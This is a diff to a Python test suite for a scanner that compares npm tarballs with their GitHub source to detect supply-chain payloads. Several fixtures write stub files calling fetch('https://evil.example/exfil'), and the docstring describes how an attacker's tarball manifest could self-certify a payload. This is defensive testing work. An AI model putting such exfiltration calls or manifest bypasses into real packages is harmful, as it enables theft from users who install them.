@@ -34,6 +34,40 @@ Cases 1, 2, and 5 are guarded by the invalid-map and build-dir excuse checks,
 which predate this mutation round; they were exercised directly by writing
 and running each test against the code before its corresponding fix landed,
 during PR C's own development.
+
+A third mutation, added for PR D's external-build handling: removing the
+`_is_generated_unverifiable` check from `compare_sources` entirely flips case
+10 (`test_case_10_external_build_generated_files_are_generated_unverifiable`)
+from `signal=False` to `signal=True` — the files fall through to the ordinary
+`unexplained`/`unverifiable` path and become strong signals, since their
+PROCESS category is genuinely absent from the GitHub scan. Cases 3 and 5
+(matched-file and declared-build-dir bypasses, neither involving
+`external_build_markers`) are unaffected by this mutation, confirming the new
+check only ever *suppresses* signal for files that are both declared by the
+manifest and backed by a real repo-root build marker — it never widens an
+existing excuse.
+
+A fourth mutation, applied and reverted during review of the same feature:
+reading `_declared_manifest_paths`/`hook_node_files_from_package_json` from
+`tarball_package_json` instead of `github_package_json` (i.e. checking the
+tarball's own manifest against itself) flips cases 14 and 15
+(`test_case_14_tarball_only_manifest_declaration_cannot_self_certify`,
+`test_case_15_tarball_only_files_dir_cannot_self_certify`) from `signal=True`
+to `signal=False` — an attacker's own `"main": "evil.js"` or
+`"files": ["payload"]` declaration, with no corresponding GitHub-side
+declaration, would otherwise self-certify past the check whenever the repo
+happens to have any build marker at its root (common even for plain JS
+repos with an unrelated Makefile). Case 10 is unaffected by this mutation
+(its declaration is genuine on both sides), confirming the fix is specific to
+the self-certification path rather than breaking the legitimate case.
+
+Note that `_is_generated_unverifiable` deliberately has no declared-*directory*
+excuse at all (only exact main/bin/exports/hook-target paths) — see case 16
+(`test_case_16_declared_directory_is_not_excused_only_exact_paths_are`), which
+documents this as an accepted trade-off rather than a bypass: esbuild's real
+shape needs only exact paths, and a directory-level excuse would be far
+broader than the exact-path one, so it isn't a "mutation that should flip a
+test" here — it's scope that was never added.
 """
 
 import json
@@ -226,3 +260,205 @@ def test_case_9_legit_bundle_with_declared_dependency_has_no_signal(tmp_path):
     report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
     assert report.bundled_dependency == ["bundle.js"]
     assert report.signal is False
+
+
+def test_case_10_external_build_generated_files_are_generated_unverifiable(tmp_path):
+    """esbuild-shaped: a Go+Makefile monorepo generates bin/esbuild and
+    lib/main.js at publish time. They're declared by the *GitHub* repo's own
+    manifest (not just the tarball's — the tarball copies it, as a real
+    publish would) and the repo has a real build marker, so they're
+    informational (generated_unverifiable), never a signal."""
+    tarball_dir = _fetched_dir(tmp_path, "tarball")
+    (tarball_dir / "lib").mkdir()
+    (tarball_dir / "lib" / "main.js").write_text("require('child_process').spawn('x');")
+    (tarball_dir / "bin").mkdir()
+    (tarball_dir / "bin" / "esbuild").write_text(
+        "#!/usr/bin/env node\nrequire('child_process').spawn('x');"
+    )
+    (tarball_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "main": "lib/main.js", "bin": {"esbuild": "bin/esbuild"}})
+    )
+    github_dir = _fetched_dir(tmp_path, "github")
+    (github_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "main": "lib/main.js", "bin": {"esbuild": "bin/esbuild"}})
+    )
+
+    tarball_profile = _profile(
+        [
+            _evidence("lib/main.js", CapabilityCategory.PROCESS),
+            _evidence("bin/esbuild", CapabilityCategory.PROCESS),
+        ]
+    )
+    github_profile = _profile(external_build_markers=["Makefile", "go.mod"])
+    report = compare_sources(
+        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
+    )
+    assert set(report.generated_unverifiable) == {"lib/main.js", "bin/esbuild"}
+    assert report.signal is False
+    assert report.signal_files == {}
+
+
+def test_case_11_no_build_marker_means_no_free_pass(tmp_path):
+    """Same shape as case 10, but the GitHub repo has no detected build
+    marker — the generated files get no excuse and stay a strong signal."""
+    tarball_dir = _fetched_dir(tmp_path, "tarball")
+    (tarball_dir / "lib").mkdir()
+    (tarball_dir / "lib" / "main.js").write_text("require('child_process').spawn('x');")
+    (tarball_dir / "bin").mkdir()
+    (tarball_dir / "bin" / "esbuild").write_text(
+        "#!/usr/bin/env node\nrequire('child_process').spawn('x');"
+    )
+    (tarball_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "main": "lib/main.js", "bin": {"esbuild": "bin/esbuild"}})
+    )
+    github_dir = _fetched_dir(tmp_path, "github")
+    (github_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "main": "lib/main.js", "bin": {"esbuild": "bin/esbuild"}})
+    )
+
+    tarball_profile = _profile(
+        [
+            _evidence("lib/main.js", CapabilityCategory.PROCESS),
+            _evidence("bin/esbuild", CapabilityCategory.PROCESS),
+        ]
+    )
+    github_profile = _profile()  # no external_build_markers
+    report = compare_sources(
+        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
+    )
+    assert report.generated_unverifiable == []
+    assert report.signal is True
+    assert set(report.signal_files) == {"lib/main.js", "bin/esbuild"}
+
+
+def test_case_12_undeclared_file_with_marker_present_still_signals(tmp_path):
+    """A build marker being present doesn't excuse *every* file in the
+    package — only ones the GitHub manifest actually declares. A stray
+    evil.js alongside the (GitHub-declared) bin/esbuild still signals."""
+    tarball_dir = _fetched_dir(tmp_path, "tarball")
+    (tarball_dir / "bin").mkdir()
+    (tarball_dir / "bin" / "esbuild").write_text("require('child_process').spawn('x');")
+    (tarball_dir / "evil.js").write_text("require('child_process').spawn('evil');")
+    (tarball_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "bin": {"esbuild": "bin/esbuild"}})
+    )
+    github_dir = _fetched_dir(tmp_path, "github")
+    (github_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "bin": {"esbuild": "bin/esbuild"}})
+    )
+
+    tarball_profile = _profile(
+        [
+            _evidence("bin/esbuild", CapabilityCategory.PROCESS),
+            _evidence("evil.js", CapabilityCategory.PROCESS),
+        ]
+    )
+    github_profile = _profile(external_build_markers=["Makefile"])
+    report = compare_sources(
+        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
+    )
+    assert report.generated_unverifiable == ["bin/esbuild"]
+    assert report.signal is True
+    assert "evil.js" in report.signal_files
+
+
+def test_case_14_tarball_only_manifest_declaration_cannot_self_certify(tmp_path):
+    """The bypass a review round caught: an attacker can't excuse their own
+    payload by declaring it in the *tarball's* package.json alone — GitHub's
+    own manifest doesn't declare it, so it stays a strong signal even though
+    a (coincidental, common) build marker is present at the repo root."""
+    tarball_dir = _fetched_dir(tmp_path, "tarball")
+    (tarball_dir / "evil.js").write_text("fetch('https://evil.example/exfil');")
+    (tarball_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "main": "evil.js", "bin": {"x": "evil.js"}})
+    )
+    github_dir = _fetched_dir(tmp_path, "github")
+    # GitHub's real manifest declares neither `main` nor `bin` at all.
+    (github_dir / "package.json").write_text(json.dumps({"name": "pkg"}))
+
+    tarball_profile = _profile([_evidence("evil.js", CapabilityCategory.NETWORK)])
+    github_profile = _profile(external_build_markers=["Makefile"])
+    report = compare_sources(
+        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
+    )
+    assert report.generated_unverifiable == []
+    assert report.signal is True
+    assert "evil.js" in report.signal_files
+
+
+def test_case_15_tarball_only_files_dir_cannot_self_certify(tmp_path):
+    """Same bypass shape via a declared build *directory* rather than a
+    single file: the tarball declares "files": ["payload"], but GitHub's own
+    manifest declares no such directory, so everything under payload/ stays
+    unexplained and signals."""
+    tarball_dir = _fetched_dir(tmp_path, "tarball")
+    (tarball_dir / "payload").mkdir()
+    (tarball_dir / "payload" / "evil.js").write_text("fetch('https://evil.example/exfil');")
+    (tarball_dir / "package.json").write_text(json.dumps({"name": "pkg", "files": ["payload"]}))
+    github_dir = _fetched_dir(tmp_path, "github")
+    (github_dir / "package.json").write_text(json.dumps({"name": "pkg"}))
+
+    tarball_profile = _profile([_evidence("payload/evil.js", CapabilityCategory.NETWORK)])
+    github_profile = _profile(external_build_markers=["Makefile"])
+    report = compare_sources(
+        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
+    )
+    assert report.generated_unverifiable == []
+    assert report.signal is True
+    assert "payload/evil.js" in report.signal_files
+
+
+def test_case_13_hook_target_file_counts_as_declared_even_without_main_or_bin(tmp_path):
+    """esbuild's actual shape: `install.js` is named only by the `postinstall`
+    script (`"node install.js"`), never by main/bin/files/exports — it must
+    still count as "declared by the manifest" for the external-build excuse,
+    or the exact case this feature was built for stays a false signal."""
+    tarball_dir = _fetched_dir(tmp_path, "tarball")
+    (tarball_dir / "install.js").write_text("require('child_process').spawn('x');")
+    (tarball_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "scripts": {"postinstall": "node install.js"}})
+    )
+    github_dir = _fetched_dir(tmp_path, "github")
+    (github_dir / "package.json").write_text(
+        json.dumps({"name": "pkg", "scripts": {"postinstall": "node install.js"}})
+    )
+
+    tarball_profile = _profile([_evidence("install.js", CapabilityCategory.PROCESS)])
+    github_profile = _profile(external_build_markers=["Makefile", "go.mod"])
+    report = compare_sources(
+        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
+    )
+    assert report.generated_unverifiable == ["install.js"]
+    assert report.signal is False
+
+
+def test_case_16_declared_directory_is_not_excused_only_exact_paths_are(tmp_path):
+    """Deliberate trade-off: `_is_generated_unverifiable` excuses only
+    *exact* declared paths (main/bin/exports/hook targets), never a whole
+    declared directory — unlike `_classify_build`. GitHub declaring
+    "main": "lib/index.js" doesn't excuse an unrelated tarball-only
+    lib/evil.js sitting in the same top-level directory, even with a real
+    build marker present: esbuild's real shape (bin/esbuild, install.js,
+    lib/main.js) is fully covered by exact paths, and a directory-level
+    excuse would be far broader — any tarball-only file dropped into a
+    package's declared main/files directory would get waved through on
+    nothing more than "the repo has a build marker somewhere"."""
+    tarball_dir = _fetched_dir(tmp_path, "tarball")
+    (tarball_dir / "lib").mkdir()
+    (tarball_dir / "lib" / "index.js").write_text("module.exports = {};")
+    (tarball_dir / "lib" / "evil.js").write_text("fetch('https://evil.example/exfil');")
+    (tarball_dir / "package.json").write_text(json.dumps({"name": "pkg", "main": "lib/index.js"}))
+    github_dir = _fetched_dir(tmp_path, "github")
+    (github_dir / "package.json").write_text(json.dumps({"name": "pkg", "main": "lib/index.js"}))
+    (github_dir / "lib").mkdir()
+    (github_dir / "lib" / "index.js").write_text("module.exports = {};")
+
+    tarball_profile = _profile([_evidence("lib/evil.js", CapabilityCategory.NETWORK)])
+    github_profile = _profile(external_build_markers=["Makefile"])
+    report = compare_sources(
+        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
+    )
+    assert "lib/index.js" in report.matched
+    assert report.generated_unverifiable == []
+    assert report.signal is True
+    assert "lib/evil.js" in report.signal_files
